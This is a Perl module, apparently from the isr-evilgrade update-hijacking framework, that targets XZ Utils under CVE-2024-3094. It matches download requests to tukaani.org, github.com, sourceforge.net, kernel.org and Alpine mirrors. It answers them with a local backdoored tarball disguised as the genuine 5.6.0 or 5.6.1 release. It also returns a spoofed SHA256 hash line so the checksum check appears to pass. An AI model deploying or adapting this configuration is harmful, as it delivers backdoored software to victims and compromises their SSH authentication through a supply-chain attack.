###############
# xz_utils.pm
#
# CVE-2024-3094: XZ Utils supply chain backdoor
# Malicious code injection in tarball during release process
# Compromises sshd authentication mechanisms
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::xz_utils;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'XZ Utils',
    'version'     => '1.0',
    'appver'      => '5.6.0, 5.6.1',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2024-3094: XZ Utils backdoor injection in release tarball.
Supply chain attack that compromises sshd public key authentication.
Injects backdoor during tarball extraction and build process.
Affects Linux distributions using xz-utils < 5.6.2.
    },
    'vh' => '(tukaani\.org|github\.com|sourceforge\.net|kernel\.org|distfiles\.alpinelinux\.org)',
    'request' => [
        {
            'req'   => '/xz/xz-5\.(6\.[01]|4.*|5\.[0-5])\.tar\.(gz|bz2|xz)',
            'type'  => 'file',
            'file'  => './include/xz/xz-backdoor.tar.gz',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/x-gzip\r\n"
                . "Content-Disposition: attachment; filename=xz-5.6.0.tar.gz\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/releases/download/.*xz.*\.(tar\.gz|tar\.xz)',
            'type'  => 'file',
            'file'  => './include/xz/xz-backdoor.tar.xz',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/x-xz\r\n"
                . "Content-Disposition: attachment; filename=xz-5.6.1.tar.xz\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/xz.*sha.*',
            'type'  => 'string',
            'string' => 'SPOOFED_SHA256_HASH  xz-5.6.1.tar.xz',
            'parse' => 1,
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
